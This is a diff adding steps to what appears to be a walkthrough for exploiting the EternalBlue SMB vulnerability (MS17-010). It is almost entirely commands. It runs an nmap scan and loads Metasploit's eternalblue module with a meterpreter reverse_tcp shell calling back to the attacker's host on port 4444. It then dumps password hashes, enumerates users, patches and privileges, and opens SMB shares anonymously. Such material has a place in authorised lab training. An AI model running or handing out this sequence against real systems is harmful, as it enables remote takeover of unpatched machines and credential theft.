@@ -21,3 +21,38 @@ Begin by scanning the target machine to identify open SMB ports and verify if th
 ```bash
 nmap -p 445 --script smb-vuln-ms17-010 <target-ip>
 
+A positive detection confirms the target is vulnerable.
+
+Step 2: Confirm Exploit Availability
+Check your local exploit database for EternalBlue modules to ensure you have the tools ready:
+
+2) searchsploit ms17-010
+
+3) msfconsole
+
+4) search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+
+set RHOSTS <target-ip>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <your-ip>
+set LPORT 4444
+
+exploit
+
+4) sysinfo
+   getuid
+   hashdump
+
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/enum_patches
+run post/windows/gather/enum_privs
+
+smbclient -L //<target-ip> -N
+
+smbclient //<target-ip>/ShareName -N
+
+
+
+
+
